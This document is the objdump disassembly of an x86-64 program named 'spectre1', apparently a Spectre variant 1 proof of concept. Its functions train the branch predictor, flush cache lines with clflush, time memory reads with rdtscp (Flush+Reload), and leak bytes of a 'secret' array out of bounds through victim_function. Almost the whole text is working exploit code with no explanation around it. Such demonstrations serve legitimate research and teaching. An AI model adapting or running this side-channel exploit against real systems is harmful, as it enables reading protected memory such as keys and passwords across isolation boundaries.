
spectre1:     file format elf64-x86-64


Disassembly of section .init:

0000000000000560 <_init>:
 560:	48 83 ec 08          	sub    $0x8,%rsp
 564:	48 8b 05 7d 0a 20 00 	mov    0x200a7d(%rip),%rax        # 200fe8 <__gmon_start__>
 56b:	48 85 c0             	test   %rax,%rax
 56e:	74 02                	je     572 <_init+0x12>
 570:	ff d0                	callq  *%rax
 572:	48 83 c4 08          	add    $0x8,%rsp
 576:	c3                   	retq   

Disassembly of section .plt:

0000000000000580 <.plt>:
 580:	ff 35 2a 0a 20 00    	pushq  0x200a2a(%rip)        # 200fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
 586:	ff 25 2c 0a 20 00    	jmpq   *0x200a2c(%rip)        # 200fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
 58c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000590 <free@plt>:
 590:	ff 25 2a 0a 20 00    	jmpq   *0x200a2a(%rip)        # 200fc0 <free@GLIBC_2.2.5>
 596:	68 00 00 00 00       	pushq  $0x0
 59b:	e9 e0 ff ff ff       	jmpq   580 <.plt>

00000000000005a0 <printf@plt>:
 5a0:	ff 25 22 0a 20 00    	jmpq   *0x200a22(%rip)        # 200fc8 <printf@GLIBC_2.2.5>
 5a6:	68 01 00 00 00       	pushq  $0x1
 5ab:	e9 d0 ff ff ff       	jmpq   580 <.plt>

00000000000005b0 <malloc@plt>:
 5b0:	ff 25 1a 0a 20 00    	jmpq   *0x200a1a(%rip)        # 200fd0 <malloc@GLIBC_2.2.5>
 5b6:	68 02 00 00 00       	pushq  $0x2
 5bb:	e9 c0 ff ff ff       	jmpq   580 <.plt>

Disassembly of section .plt.got:

00000000000005c0 <__cxa_finalize@plt>:
 5c0:	ff 25 32 0a 20 00    	jmpq   *0x200a32(%rip)        # 200ff8 <__cxa_finalize@GLIBC_2.2.5>
 5c6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000000005d0 <_start>:
 5d0:	31 ed                	xor    %ebp,%ebp
 5d2:	49 89 d1             	mov    %rdx,%r9
 5d5:	5e                   	pop    %rsi
 5d6:	48 89 e2             	mov    %rsp,%rdx
 5d9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 5dd:	50                   	push   %rax
 5de:	54                   	push   %rsp
 5df:	4c 8d 05 1a 05 00 00 	lea    0x51a(%rip),%r8        # b00 <__libc_csu_fini>
 5e6:	48 8d 0d a3 04 00 00 	lea    0x4a3(%rip),%rcx        # a90 <__libc_csu_init>
 5ed:	48 8d 3d 8d 03 00 00 	lea    0x38d(%rip),%rdi        # 981 <main>
 5f4:	ff 15 e6 09 20 00    	callq  *0x2009e6(%rip)        # 200fe0 <__libc_start_main@GLIBC_2.2.5>
 5fa:	f4                   	hlt    
 5fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000600 <deregister_tm_clones>:
 600:	48 8d 3d 09 0b 20 00 	lea    0x200b09(%rip),%rdi        # 201110 <__TMC_END__>
 607:	55                   	push   %rbp
 608:	48 8d 05 01 0b 20 00 	lea    0x200b01(%rip),%rax        # 201110 <__TMC_END__>
 60f:	48 39 f8             	cmp    %rdi,%rax
 612:	48 89 e5             	mov    %rsp,%rbp
 615:	74 19                	je     630 <deregister_tm_clones+0x30>
 617:	48 8b 05 ba 09 20 00 	mov    0x2009ba(%rip),%rax        # 200fd8 <_ITM_deregisterTMCloneTable>
 61e:	48 85 c0             	test   %rax,%rax
 621:	74 0d                	je     630 <deregister_tm_clones+0x30>
 623:	5d                   	pop    %rbp
 624:	ff e0                	jmpq   *%rax
 626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 62d:	00 00 00 
 630:	5d                   	pop    %rbp
 631:	c3                   	retq   
 632:	0f 1f 40 00          	nopl   0x0(%rax)
 636:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 63d:	00 00 00 

0000000000000640 <register_tm_clones>:
 640:	48 8d 3d c9 0a 20 00 	lea    0x200ac9(%rip),%rdi        # 201110 <__TMC_END__>
 647:	48 8d 35 c2 0a 20 00 	lea    0x200ac2(%rip),%rsi        # 201110 <__TMC_END__>
 64e:	55                   	push   %rbp
 64f:	48 29 fe             	sub    %rdi,%rsi
 652:	48 89 e5             	mov    %rsp,%rbp
 655:	48 c1 fe 03          	sar    $0x3,%rsi
 659:	48 89 f0             	mov    %rsi,%rax
 65c:	48 c1 e8 3f          	shr    $0x3f,%rax
 660:	48 01 c6             	add    %rax,%rsi
 663:	48 d1 fe             	sar    %rsi
 666:	74 18                	je     680 <register_tm_clones+0x40>
 668:	48 8b 05 81 09 20 00 	mov    0x200981(%rip),%rax        # 200ff0 <_ITM_registerTMCloneTable>
 66f:	48 85 c0             	test   %rax,%rax
 672:	74 0c                	je     680 <register_tm_clones+0x40>
 674:	5d                   	pop    %rbp
 675:	ff e0                	jmpq   *%rax
 677:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 67e:	00 00 
 680:	5d                   	pop    %rbp
 681:	c3                   	retq   
 682:	0f 1f 40 00          	nopl   0x0(%rax)
 686:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 68d:	00 00 00 

0000000000000690 <__do_global_dtors_aux>:
 690:	80 3d 89 0a 20 00 00 	cmpb   $0x0,0x200a89(%rip)        # 201120 <completed.7697>
 697:	75 2f                	jne    6c8 <__do_global_dtors_aux+0x38>
 699:	48 83 3d 57 09 20 00 	cmpq   $0x0,0x200957(%rip)        # 200ff8 <__cxa_finalize@GLIBC_2.2.5>
 6a0:	00 
 6a1:	55                   	push   %rbp
 6a2:	48 89 e5             	mov    %rsp,%rbp
 6a5:	74 0c                	je     6b3 <__do_global_dtors_aux+0x23>
 6a7:	48 8b 3d 5a 09 20 00 	mov    0x20095a(%rip),%rdi        # 201008 <__dso_handle>
 6ae:	e8 0d ff ff ff       	callq  5c0 <__cxa_finalize@plt>
 6b3:	e8 48 ff ff ff       	callq  600 <deregister_tm_clones>
 6b8:	c6 05 61 0a 20 00 01 	movb   $0x1,0x200a61(%rip)        # 201120 <completed.7697>
 6bf:	5d                   	pop    %rbp
 6c0:	c3                   	retq   
 6c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 6c8:	f3 c3                	repz retq 
 6ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000006d0 <frame_dummy>:
 6d0:	55                   	push   %rbp
 6d1:	48 89 e5             	mov    %rsp,%rbp
 6d4:	5d                   	pop    %rbp
 6d5:	e9 66 ff ff ff       	jmpq   640 <register_tm_clones>

00000000000006da <victim_function>:
 6da:	55                   	push   %rbp
 6db:	48 89 e5             	mov    %rsp,%rbp
 6de:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 6e2:	8b 05 38 09 20 00    	mov    0x200938(%rip),%eax        # 201020 <bufferSize>
 6e8:	48 98                	cltq   
 6ea:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 6ee:	73 34                	jae    724 <victim_function+0x4a>
 6f0:	48 8d 15 49 09 20 00 	lea    0x200949(%rip),%rdx        # 201040 <buffer>
 6f7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 6fb:	48 01 d0             	add    %rdx,%rax
 6fe:	0f b6 00             	movzbl (%rax),%eax
 701:	0f b6 c0             	movzbl %al,%eax
 704:	c1 e0 0c             	shl    $0xc,%eax
 707:	48 63 d0             	movslq %eax,%rdx
 70a:	48 8d 05 2f 0a 20 00 	lea    0x200a2f(%rip),%rax        # 201140 <array>
 711:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 715:	0f b6 05 05 0a 20 00 	movzbl 0x200a05(%rip),%eax        # 201121 <temp>
 71c:	21 d0                	and    %edx,%eax
 71e:	88 05 fd 09 20 00    	mov    %al,0x2009fd(%rip)        # 201121 <temp>
 724:	90                   	nop
 725:	5d                   	pop    %rbp
 726:	c3                   	retq   

0000000000000727 <find_cached_index>:
 727:	55                   	push   %rbp
 728:	48 89 e5             	mov    %rsp,%rbp
 72b:	53                   	push   %rbx
 72c:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 730:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 737:	eb 74                	jmp    7ad <find_cached_index+0x86>
 739:	8b 45 e8             	mov    -0x18(%rbp),%eax
 73c:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
 742:	83 c0 0d             	add    $0xd,%eax
 745:	25 ff 00 00 00       	and    $0xff,%eax
 74a:	89 45 ec             	mov    %eax,-0x14(%rbp)
 74d:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 754:	00 
 755:	8b 45 ec             	mov    -0x14(%rbp),%eax
 758:	c1 e0 0c             	shl    $0xc,%eax
 75b:	48 63 d0             	movslq %eax,%rdx
 75e:	48 8d 05 db 09 20 00 	lea    0x2009db(%rip),%rax        # 201140 <array>
 765:	48 01 d0             	add    %rdx,%rax
 768:	48 89 c3             	mov    %rax,%rbx
 76b:	0f ae f0             	mfence 
 76e:	0f ae e8             	lfence 
 771:	0f 01 f9             	rdtscp 
 774:	49 89 c2             	mov    %rax,%r10
 777:	48 8b 0b             	mov    (%rbx),%rcx
 77a:	0f 01 f9             	rdtscp 
 77d:	4c 29 d0             	sub    %r10,%rax
 780:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 784:	48 81 7d f0 2b 01 00 	cmpq   $0x12b,-0x10(%rbp)
 78b:	00 
 78c:	77 1b                	ja     7a9 <find_cached_index+0x82>
 78e:	8b 45 ec             	mov    -0x14(%rbp),%eax
 791:	48 98                	cltq   
 793:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 79a:	00 
 79b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 79f:	48 01 d0             	add    %rdx,%rax
 7a2:	8b 10                	mov    (%rax),%edx
 7a4:	83 c2 01             	add    $0x1,%edx
 7a7:	89 10                	mov    %edx,(%rax)
 7a9:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 7ad:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 7b4:	7e 83                	jle    739 <find_cached_index+0x12>
 7b6:	90                   	nop
 7b7:	5b                   	pop    %rbx
 7b8:	5d                   	pop    %rbp
 7b9:	c3                   	retq   

00000000000007ba <find_highest_score>:
 7ba:	55                   	push   %rbp
 7bb:	48 89 e5             	mov    %rsp,%rbp
 7be:	48 83 ec 20          	sub    $0x20,%rsp
 7c2:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 7c6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 7cd:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 7d4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 7db:	eb 3e                	jmp    81b <find_highest_score+0x61>
 7dd:	8b 45 fc             	mov    -0x4(%rbp),%eax
 7e0:	48 98                	cltq   
 7e2:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 7e9:	00 
 7ea:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 7ee:	48 01 d0             	add    %rdx,%rax
 7f1:	8b 00                	mov    (%rax),%eax
 7f3:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 7f6:	7d 1f                	jge    817 <find_highest_score+0x5d>
 7f8:	8b 45 fc             	mov    -0x4(%rbp),%eax
 7fb:	89 45 f8             	mov    %eax,-0x8(%rbp)
 7fe:	8b 45 fc             	mov    -0x4(%rbp),%eax
 801:	48 98                	cltq   
 803:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 80a:	00 
 80b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 80f:	48 01 d0             	add    %rdx,%rax
 812:	8b 00                	mov    (%rax),%eax
 814:	89 45 f4             	mov    %eax,-0xc(%rbp)
 817:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 81b:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 822:	7e b9                	jle    7dd <find_highest_score+0x23>
 824:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 827:	8b 55 f8             	mov    -0x8(%rbp),%edx
 82a:	8b 45 f8             	mov    -0x8(%rbp),%eax
 82d:	89 c6                	mov    %eax,%esi
 82f:	48 8d 3d e2 02 00 00 	lea    0x2e2(%rip),%rdi        # b18 <_IO_stdin_used+0x8>
 836:	b8 00 00 00 00       	mov    $0x0,%eax
 83b:	e8 60 fd ff ff       	callq  5a0 <printf@plt>
 840:	90                   	nop
 841:	c9                   	leaveq 
 842:	c3                   	retq   

0000000000000843 <train_victim>:
 843:	55                   	push   %rbp
 844:	48 89 e5             	mov    %rsp,%rbp
 847:	48 83 ec 30          	sub    $0x30,%rsp
 84b:	89 7d dc             	mov    %edi,-0x24(%rbp)
 84e:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
 852:	8b 0d c8 07 20 00    	mov    0x2007c8(%rip),%ecx        # 201020 <bufferSize>
 858:	8b 45 dc             	mov    -0x24(%rbp),%eax
 85b:	99                   	cltd   
 85c:	f7 f9                	idiv   %ecx
 85e:	89 d0                	mov    %edx,%eax
 860:	48 98                	cltq   
 862:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 866:	c7 45 e8 1d 00 00 00 	movl   $0x1d,-0x18(%rbp)
 86d:	e9 95 00 00 00       	jmpq   907 <train_victim+0xc4>
 872:	48 8d 05 a7 07 20 00 	lea    0x2007a7(%rip),%rax        # 201020 <bufferSize>
 879:	0f ae 38             	clflush (%rax)
 87c:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 883:	eb 1a                	jmp    89f <train_victim+0x5c>
 885:	8b 45 ec             	mov    -0x14(%rbp),%eax
 888:	c1 e0 0c             	shl    $0xc,%eax
 88b:	48 63 d0             	movslq %eax,%rdx
 88e:	48 8d 05 ab 08 20 00 	lea    0x2008ab(%rip),%rax        # 201140 <array>
 895:	48 01 d0             	add    %rdx,%rax
 898:	0f ae 38             	clflush (%rax)
 89b:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 89f:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 8a6:	7e dd                	jle    885 <train_victim+0x42>
 8a8:	0f ae f0             	mfence 
 8ab:	8b 4d e8             	mov    -0x18(%rbp),%ecx
 8ae:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
 8b3:	89 c8                	mov    %ecx,%eax
 8b5:	f7 ea                	imul   %edx
 8b7:	89 c8                	mov    %ecx,%eax
 8b9:	c1 f8 1f             	sar    $0x1f,%eax
 8bc:	29 c2                	sub    %eax,%edx
 8be:	89 d0                	mov    %edx,%eax
 8c0:	01 c0                	add    %eax,%eax
 8c2:	01 d0                	add    %edx,%eax
 8c4:	01 c0                	add    %eax,%eax
 8c6:	29 c1                	sub    %eax,%ecx
 8c8:	89 ca                	mov    %ecx,%edx
 8ca:	8d 42 ff             	lea    -0x1(%rdx),%eax
 8cd:	66 b8 00 00          	mov    $0x0,%ax
 8d1:	48 98                	cltq   
 8d3:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 8d7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 8db:	48 c1 e8 10          	shr    $0x10,%rax
 8df:	48 09 45 f8          	or     %rax,-0x8(%rbp)
 8e3:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
 8e7:	48 33 45 f0          	xor    -0x10(%rbp),%rax
 8eb:	48 23 45 f8          	and    -0x8(%rbp),%rax
 8ef:	48 33 45 f0          	xor    -0x10(%rbp),%rax
 8f3:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 8f7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 8fb:	48 89 c7             	mov    %rax,%rdi
 8fe:	e8 d7 fd ff ff       	callq  6da <victim_function>
 903:	83 6d e8 01          	subl   $0x1,-0x18(%rbp)
 907:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
 90b:	0f 89 61 ff ff ff    	jns    872 <train_victim+0x2f>
 911:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 918:	eb 09                	jmp    923 <train_victim+0xe0>
 91a:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 91d:	83 c0 01             	add    $0x1,%eax
 920:	89 45 e4             	mov    %eax,-0x1c(%rbp)
 923:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 926:	83 f8 63             	cmp    $0x63,%eax
 929:	7e ef                	jle    91a <train_victim+0xd7>
 92b:	90                   	nop
 92c:	c9                   	leaveq 
 92d:	c3                   	retq   

000000000000092e <steal_byte>:
 92e:	55                   	push   %rbp
 92f:	48 89 e5             	mov    %rsp,%rbp
 932:	48 83 ec 20          	sub    $0x20,%rsp
 936:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 93a:	89 75 e4             	mov    %esi,-0x1c(%rbp)
 93d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 944:	eb 23                	jmp    969 <steal_byte+0x3b>
 946:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 949:	48 63 d0             	movslq %eax,%rdx
 94c:	8b 45 fc             	mov    -0x4(%rbp),%eax
 94f:	48 89 d6             	mov    %rdx,%rsi
 952:	89 c7                	mov    %eax,%edi
 954:	e8 ea fe ff ff       	callq  843 <train_victim>
 959:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 95d:	48 89 c7             	mov    %rax,%rdi
 960:	e8 c2 fd ff ff       	callq  727 <find_cached_index>
 965:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 969:	81 7d fc e6 03 00 00 	cmpl   $0x3e6,-0x4(%rbp)
 970:	7e d4                	jle    946 <steal_byte+0x18>
 972:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 976:	48 89 c7             	mov    %rax,%rdi
 979:	e8 3c fe ff ff       	callq  7ba <find_highest_score>
 97e:	90                   	nop
 97f:	c9                   	leaveq 
 980:	c3                   	retq   

0000000000000981 <main>:
 981:	55                   	push   %rbp
 982:	48 89 e5             	mov    %rsp,%rbp
 985:	48 83 ec 20          	sub    $0x20,%rsp
 989:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 990:	eb 24                	jmp    9b6 <main+0x35>
 992:	8b 45 e0             	mov    -0x20(%rbp),%eax
 995:	99                   	cltd   
 996:	c1 ea 18             	shr    $0x18,%edx
 999:	01 d0                	add    %edx,%eax
 99b:	0f b6 c0             	movzbl %al,%eax
 99e:	29 d0                	sub    %edx,%eax
 9a0:	89 c1                	mov    %eax,%ecx
 9a2:	8b 45 e0             	mov    -0x20(%rbp),%eax
 9a5:	48 63 d0             	movslq %eax,%rdx
 9a8:	48 8d 05 91 07 20 00 	lea    0x200791(%rip),%rax        # 201140 <array>
 9af:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 9b2:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 9b6:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 9bd:	7e d3                	jle    992 <main+0x11>
 9bf:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 9c6:	e9 b1 00 00 00       	jmpq   a7c <main+0xfb>
 9cb:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 9d2:	eb 1a                	jmp    9ee <main+0x6d>
 9d4:	8b 45 e8             	mov    -0x18(%rbp),%eax
 9d7:	c1 e0 0c             	shl    $0xc,%eax
 9da:	48 63 d0             	movslq %eax,%rdx
 9dd:	48 8d 05 5c 07 20 00 	lea    0x20075c(%rip),%rax        # 201140 <array>
 9e4:	48 01 d0             	add    %rdx,%rax
 9e7:	0f ae 38             	clflush (%rax)
 9ea:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 9ee:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 9f5:	7e dd                	jle    9d4 <main+0x53>
 9f7:	0f ae f0             	mfence 
 9fa:	bf 00 04 00 00       	mov    $0x400,%edi
 9ff:	e8 ac fb ff ff       	callq  5b0 <malloc@plt>
 a04:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 a08:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 a0f:	eb 1e                	jmp    a2f <main+0xae>
 a11:	8b 45 ec             	mov    -0x14(%rbp),%eax
 a14:	48 98                	cltq   
 a16:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a1d:	00 
 a1e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 a22:	48 01 d0             	add    %rdx,%rax
 a25:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 a2b:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 a2f:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 a36:	7e d9                	jle    a11 <main+0x90>
 a38:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 a3b:	48 98                	cltq   
 a3d:	48 8d 0d 9c 06 20 00 	lea    0x20069c(%rip),%rcx        # 2010e0 <secret>
 a44:	48 8d 15 f5 05 20 00 	lea    0x2005f5(%rip),%rdx        # 201040 <buffer>
 a4b:	48 29 d1             	sub    %rdx,%rcx
 a4e:	48 89 ca             	mov    %rcx,%rdx
 a51:	48 01 d0             	add    %rdx,%rax
 a54:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 a58:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 a5c:	89 c2                	mov    %eax,%edx
 a5e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 a62:	89 d6                	mov    %edx,%esi
 a64:	48 89 c7             	mov    %rax,%rdi
 a67:	e8 c2 fe ff ff       	callq  92e <steal_byte>
 a6c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 a70:	48 89 c7             	mov    %rax,%rdi
 a73:	e8 18 fb ff ff       	callq  590 <free@plt>
 a78:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 a7c:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 a80:	0f 8e 45 ff ff ff    	jle    9cb <main+0x4a>
 a86:	b8 00 00 00 00       	mov    $0x0,%eax
 a8b:	c9                   	leaveq 
 a8c:	c3                   	retq   
 a8d:	0f 1f 00             	nopl   (%rax)

0000000000000a90 <__libc_csu_init>:
 a90:	41 57                	push   %r15
 a92:	41 56                	push   %r14
 a94:	49 89 d7             	mov    %rdx,%r15
 a97:	41 55                	push   %r13
 a99:	41 54                	push   %r12
 a9b:	4c 8d 25 06 03 20 00 	lea    0x200306(%rip),%r12        # 200da8 <__frame_dummy_init_array_entry>
 aa2:	55                   	push   %rbp
 aa3:	48 8d 2d 06 03 20 00 	lea    0x200306(%rip),%rbp        # 200db0 <__init_array_end>
 aaa:	53                   	push   %rbx
 aab:	41 89 fd             	mov    %edi,%r13d
 aae:	49 89 f6             	mov    %rsi,%r14
 ab1:	4c 29 e5             	sub    %r12,%rbp
 ab4:	48 83 ec 08          	sub    $0x8,%rsp
 ab8:	48 c1 fd 03          	sar    $0x3,%rbp
 abc:	e8 9f fa ff ff       	callq  560 <_init>
 ac1:	48 85 ed             	test   %rbp,%rbp
 ac4:	74 20                	je     ae6 <__libc_csu_init+0x56>
 ac6:	31 db                	xor    %ebx,%ebx
 ac8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 acf:	00 
 ad0:	4c 89 fa             	mov    %r15,%rdx
 ad3:	4c 89 f6             	mov    %r14,%rsi
 ad6:	44 89 ef             	mov    %r13d,%edi
 ad9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 add:	48 83 c3 01          	add    $0x1,%rbx
 ae1:	48 39 dd             	cmp    %rbx,%rbp
 ae4:	75 ea                	jne    ad0 <__libc_csu_init+0x40>
 ae6:	48 83 c4 08          	add    $0x8,%rsp
 aea:	5b                   	pop    %rbx
 aeb:	5d                   	pop    %rbp
 aec:	41 5c                	pop    %r12
 aee:	41 5d                	pop    %r13
 af0:	41 5e                	pop    %r14
 af2:	41 5f                	pop    %r15
 af4:	c3                   	retq   
 af5:	90                   	nop
 af6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 afd:	00 00 00 

0000000000000b00 <__libc_csu_fini>:
 b00:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000b04 <_fini>:
 b04:	48 83 ec 08          	sub    $0x8,%rsp
 b08:	48 83 c4 08          	add    $0x8,%rsp
 b0c:	c3                   	retq   
